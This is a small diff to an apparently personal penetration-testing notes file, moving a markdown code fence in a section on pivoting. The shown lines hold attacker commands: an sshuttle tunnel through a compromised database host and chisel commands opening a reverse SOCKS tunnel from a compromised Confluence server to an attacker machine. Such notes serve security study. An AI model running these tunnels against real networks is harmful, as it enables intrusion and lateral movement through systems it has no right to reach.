@@ -67,9 +67,8 @@ socks5 127.0.0.1 9998(attacker machine)
 2. kali(attacker machine): sshuttle -r database_admin@192.168.50.63(PGDATABASE01):2222 10.4.50.0/24 172.16.50.0/24
 ```
 ###### httptunnel
-```
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0c4201e9-44ae-4d2f-ad93-a5ddb4317f52)
-
+```
 Confluence01: .\chisel.exe client 192.168.45.214:8080 R:socks
 kali(attacker machine): chisel server --port 8080 --reverse/chisel server --port 8080 --socks5 --reverse
 
